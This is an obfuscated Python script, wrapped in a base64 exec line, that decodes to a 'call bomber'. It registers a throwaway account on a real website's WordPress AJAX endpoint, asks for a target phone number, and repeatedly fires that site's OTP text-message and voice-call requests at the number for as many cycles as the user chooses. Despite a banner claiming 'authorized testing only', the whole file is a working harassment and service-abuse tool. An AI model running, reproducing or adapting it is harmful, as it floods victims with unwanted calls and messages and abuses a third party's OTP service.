import base64;exec(compile(base64.b64decode('CmltcG9ydCByZQppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IHN5cwpmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgcXVvdGUKCmltcG9ydCByZXF1ZXN0cwoKCiMgQ29sb3JzIHVzaW5nIEFOU0kgZXNjYXBlIGNvZGVzICh3b3JrcyB3aXRob3V0IGNvbG9yYW1hKQpHUkVFTiA9ICJcMDMzWzkybSIKQ1lBTiA9ICJcMDMzWzk2bSIKWUVMTE9XID0gIlwwMzNbOTNtIgpNQUdFTlRBID0gIlwwMzNbOTVtIgpXSElURSA9ICJcMDMzWzk3bSIKUkVEID0gIlwwMzNbOTFtIgpSRVNFVCA9ICJcMDMzWzBtIgoKZGVmIHNsb3dfcHJpbnQodGV4dCwgZGVsYXk9MC4wMDIpOgogICAgIiIiUHJpbnQgdGV4dCBjaGFyYWN0ZXIgYnkgY2hhcmFjdGVyIGZvciBhbmltYXRpb24gZWZmZWN0IiIiCiAgICBmb3IgY2hhciBpbiB0ZXh0OgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoY2hhcikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKGRlbGF5KQogICAgcHJpbnQoKQoKZGVmIHByaW50X2Jhbm5lcigpOgogICAgYmFubmVyID0gZiIiIgp7Q1lBTn0g4paEICAgICAgICAgICAgICAg4paEICDiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloQgIOKWhCAgICAgICDiloQgCuKWkOKWkeKWjCAgICAgICAgICAgICDilpDilpHilozilpDilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilozilpDilpHilowgICAgIOKWkOKWkeKWjAog4paQ4paR4paMICAgICAgICAgICDilpDilpHilowg4paQ4paR4paI4paA4paA4paA4paA4paA4paA4paA4paA4paAICDilpDilpHilowgICDilpDilpHilowgCiAg4paQ4paR4paMICAgICAgICAg4paQ4paR4paMICDilpDilpHilowgICAgICAgICAgICDilpDilpHilowg4paQ4paR4paMICAKICAg4paQ4paR4paMICAgICAgIOKWkOKWkeKWjCAgIOKWkOKWkeKWiOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhCAgICDilpDilpHilpDilpHilowgICAKICAgIOKWkOKWkeKWjCAgICAg4paQ4paR4paMICAgIOKWkOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWjCAgICDilpDilpHilowgICAgCiAgICAg4paQ4paR4paMICAg4paQ4paR4paMICAgICDilpDilpHilojiloDiloDiloDiloDiloDiloDiloDiloDiloAgICAg4paQ4paR4paM4paR4paMICAgCiAgICAgIOKWkOKWkeKWjCDilpDilpHilowgICAgICDilpDilpHilowgICAgICAgICAgICDilpDilpHilowg4paQ4paR4paMICAKICAgICAgIOKWkOKWkeKWkOKWkeKWjCAgICAgICDilpDilpHilojiloTiloTiloTiloTiloTiloTiloTiloTiloQgIOKWkOKWkeKWjCAgIOKWkOKWkeKWjCAKICAgICAgICDilpDilpHilowgICAgICAgIOKWkOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWjOKWkOKWkeKWjCAgICAg4paQ4paR4paMCiAgICAgICAgIOKWgCAgICAgICAgICDiloDiloDiloDiloDiloDiloDiloDiloDiloDiloDiloAgIOKWgCAgICAgICDiloAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKe01BR0VOVEF9ICAgICAgICAgICAgY2FsbCBib21iZXIgfCBjYWxsIGJvc29tIAogICAg8J+UuSBwcmludCgiICAgQXV0aG9yaXplZCB0ZXN0aW5nIG9ubHkg4oCiICBieSBSYW50dSIpIPCflLl7UkVTRVR9CntZRUxMT1d9ICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgICAgICAge0dSRUVOfURldmVsb3BlZCBieTp7V0hJVEV9IFF1YWRyYV92NjkKICAgICAgICAgIHtHUkVFTn1JbnN0YWdyYW06ICB7V0hJVEV9aW5zdGFncmFtLmNvbS9yZWZsYW1lLngKICAgICAgICAgIHtHUkVFTn1HaXRIdWI6ICAgICB7V0hJVEV9Z2l0aHViLmNvbS9xdWFkcmEtdjY5CiAgICAgICAgICB7R1JFRU59WCAoVHdpdHRlcik6e1dISVRFfXguY29tL3F1YWRyYV92NjkKICAgICAgICAgIHtHUkVFTn1MaW5rZWRJbjogICB7V0hJVEV9bGlua2VkaW4uY29tL2luL3JhbnR1LWRldgp7WUVMTE9XfSAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17UkVTRVR9CiIiIgogICAgc2xvd19wcmludChiYW5uZXIsIDAuMDAwOCkgICMgU21vb3RoIGhhY2tlci1zdHlsZSBhbmltYXRpb24KCgojIC0tLSBTYWZldHk6IG1pcnJvciBjdXJsIC1rIC0tLQpyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKVVJMID0gImh0dHBzOi8vaXBwbC5pbi93cC1hZG1pbi9hZG1pbi1hamF4LnBocCIKVUEgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2IgoKQkFTRV9IRUFERVJTID0gewogICAgIkhvc3QiOiAiaXBwbC5pbiIsCiAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICJYLVJlcXVlc3RlZC1XaXRoIjogIlhNTEh0dHBSZXF1ZXN0IiwKICAgICJVc2VyLUFnZW50IjogVUEsCiAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDEiLAogICAgIkROVCI6ICIxIiwKICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IiwKICAgICJPcmlnaW4iOiAiaHR0cHM6Ly9pcHBsLmluIiwKICAgICJTZWMtRmV0Y2gtU2l0ZSI6ICJzYW1lLW9yaWdpbiIsCiAgICAiU2VjLUZldGNoLU1vZGUiOiAiY29ycyIsCiAgICAiU2VjLUZldGNoLURlc3QiOiAiZW1wdHkiLAogICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIKfQoKZGVmIGVuYyh2OiBzdHIpIC0+IHN0cjoKICAgICIiIlBlcmNlbnQtZW5jb2RlIHdpdGggbm8gc2FmZSBjaGFycyAoc3BhY2VzIC0+ICUyMCkuIiIiCiAgICByZXR1cm4gcXVvdGUodiwgc2FmZT0iIikKCmRlZiByYW5kX2VtYWlsKCkgLT4gc3RyOgogICAgdXNlcm5hbWUgPSAiIi5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sb3dlcmNhc2UgKyBzdHJpbmcuZGlnaXRzLCBrPTEwKSkKICAgIHJldHVybiBmInt1c2VybmFtZX1AZ21haWwuY29tIgoKZGVmIHBvc3QoZGF0YTogc3RyLCByZWZlcmVyOiBzdHIsIHRhZzogc3RyKToKICAgICIiIlBPU1Qgd2l0aCBnaXZlbiB1cmxlbmNvZGVkICdkYXRhJyBzdHJpbmcsIGFkZGluZyBSZWZlcmVyIHBlciBzdGVwLiIiIgogICAgaGVhZGVycyA9IGRpY3QoQkFTRV9IRUFERVJTKQogICAgaGVhZGVyc1siUmVmZXJlciJdID0gcmVmZXJlcgogICAgcmVzcCA9IHJlcXVlc3RzLnBvc3QoVVJMLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSwgdmVyaWZ5PUZhbHNlLCB0aW1lb3V0PTMwKQogICAgcHJpbnQoZiJbe3RhZ31dIEhUVFAge3Jlc3Auc3RhdHVzX2NvZGV9IikKICAgIGlmIHJlc3AudGV4dDoKICAgICAgICAjIHByaW50IGZpcnN0IDEwMDAgY2hhcnMgdG8ga2VlcCBvdXRwdXQgcmVhZGFibGUKICAgICAgICBwcmludChyZXNwLnRleHRbOjEwMDBdKQogICAgcmV0dXJuIHJlc3AKCmRlZiBzaWdudXAocGhvbmU6IHN0cik6CiAgICAiIiJSdW4gc2lnbnVwIGV4YWN0bHkgb25jZSB3aXRoIHJhbmRvbWl6ZWQgZW1haWwgYW5kIHJlcXVpcmVkIHBhc3N3b3JkK2NvdW50cnkuIiIiCiAgICBlbWFpbCA9IHJhbmRfZW1haWwoKQogICAgIyBCdWlsZCBuZXN0ZWQgcG9zdGRhdGEgZXhhY3RseSBsaWtlIHlvdXIgY3VybCAoaW5uZXIgaz12IHBhaXJzLCB0aGVuIGVuY29kZSBhcyB0aGUgcG9zdGRhdGEgdmFsdWUpLgogICAgaW5uZXIgPSAoCiAgICAgICAgZiJzaWdub25zZWN1cml0eT17ZW5jKCdjNGYwNzNjMmIzJyl9IgogICAgICAgIGYiJl93cF9odHRwX3JlZmVyZXI9e2VuYygnL3JlZ2lzdGVyLycpfSIKICAgICAgICBmIiZmdWxsX25hbWU9e2VuYygnZHNnZGpmZmhqIGZmZCcpfSIKICAgICAgICBmIiZwaG9uZV9udW1iZXI9e2VuYyhwaG9uZSl9IgogICAgICAgIGYiJmVtYWlsPXtlbmMoZW1haWwpfSIKICAgICAgICBmIiZwYXNzd29yZD17ZW5jKCdxd2VBU0QzMjFAJyl9IgogICAgICAgIGYiJmNvdW50cnk9e2VuYygnSW5kaWEnKX0iCiAgICApCiAgICBkYXRhID0gZiJhY3Rpb249cmVnaXN0ZXJfdXNlciZwb3N0ZGF0YT17ZW5jKGlubmVyKX0iCiAgICBwcmludChmIlsrXSBTaWdudXAgd2l0aCBwaG9uZSB7cGhvbmV9IGFuZCBlbWFpbCB7ZW1haWx9IikKICAgIHJldHVybiBwb3N0KGRhdGEsICJodHRwczovL2lwcGwuaW4vcmVnaXN0ZXIvIiwgIlNJR05VUCIpCgpkZWYgc2VuZF9vdHBfc21zKHBob25lOiBzdHIpOgogICAgIiIiQWN0aW9uIDI6IE9UUCB2aWEgU01TLiBNdXN0IGJlIHNlbnQgYmVmb3JlIE9UUCBjYWxsIGluIGVhY2ggY3ljbGUuIiIiCiAgICBpbm5lciA9IGYicGhvbmU9e2VuYyhwaG9uZSl9IgogICAgZGF0YSA9IGYiYWN0aW9uPWxvZ2luX290cF9zZW50JnBvc3RkYXRhPXtlbmMoaW5uZXIpfSIKICAgIHJldHVybiBwb3N0KGRhdGEsICJodHRwczovL2lwcGwuaW4vbG9naW4td2l0aC1vdHAvIiwgIk9UUC1TTVMiKQoKZGVmIHNlbmRfb3RwX2NhbGwocGhvbmU6IHN0cik6CiAgICAiIiJBY3Rpb24gMzogT1RQIHZpYSBDYWxsLiIiIgogICAgZGF0YSA9IGYiYWN0aW9uPWxvZ2luX3JldHJ5b3RwX3NlbnQmcGhvbmU9e2VuYyhwaG9uZSl9IgogICAgcmV0dXJuIHBvc3QoZGF0YSwgImh0dHBzOi8vaXBwbC5pbi9sb2dpbi13aXRoLW90cC8iLCAiT1RQLUNBTEwiKQoKCiAgICAKCmRlZiBtYWluKCk6CiAgICBwcmludF9iYW5uZXIoKQogICAgcGhvbmUgPSBpbnB1dCgiRW50ZXIgdGFyZ2V0IHBob25lIChkaWdpdHMgb25seSk6ICIpLnN0cmlwKCkKICAgIHBob25lID0gcmUuc3ViKHIiXEQiLCAiIiwgcGhvbmUpCiAgICBpZiBub3QgcGhvbmU6CiAgICAgICAgcmFpc2UgU3lzdGVtRXhpdCgiTm8gcGhvbmUgbnVtYmVyIHByb3ZpZGVkLiIpCgogICAgY3ljbGVzX3N0ciA9IGlucHV0KCJIb3cgbWFueSBjeWNsZXMgKGVhY2ggZG9lczogT1RQLVNNUyB0aGVuIE9UUC1DQUxMKT86ICIpLnN0cmlwKCkKICAgIGN5Y2xlcyA9IGludChjeWNsZXNfc3RyIG9yICIxIikKCiAgICBkZWxheV9zdHIgPSBpbnB1dCgiRGVsYXkgYmV0d2VlbiByZXF1ZXN0cyBpbiBzZWNvbmRzIChlLmcuLCAwLjUpLiBQcmVzcyBFbnRlciBmb3Igbm9uZTogIikuc3RyaXAoKQogICAgZGVsYXkgPSBmbG9hdChkZWxheV9zdHIgb3IgIjAiKQoKICAgICMgMSkgU0lHTlVQIE9OQ0UKICAgIHNpZ251cChwaG9uZSkKCiAgICAjIDIpICYgMykgQWx0ZXJuYXRlOiBTTVMgdGhlbiBDQUxMLCByZXBlYXRlZCBwZXIgY3ljbGVzCiAgICBmb3IgaSBpbiByYW5nZShjeWNsZXMpOgogICAgICAgIHByaW50KGYiXG49PT0gQ3ljbGUge2krMX0ve2N5Y2xlc30gPT09IikKICAgICAgICBzZW5kX290cF9zbXMocGhvbmUpCiAgICAgICAgc2VuZF9vdHBfY2FsbChwaG9uZSkKICAgICAgICBpZiBkZWxheToKICAgICAgICAgICAgdGltZS5zbGVlcChkZWxheSkKCiAgICBwcmludCgiXG49PT0gVEVTVElORyBDT01QTEVURUQgPT09IikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB0cnk6CiAgICAgICAgbWFpbigpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoIlxuSW50ZXJydXB0ZWQgYnkgdXNlci4iKQoK'),'<string>','exec'))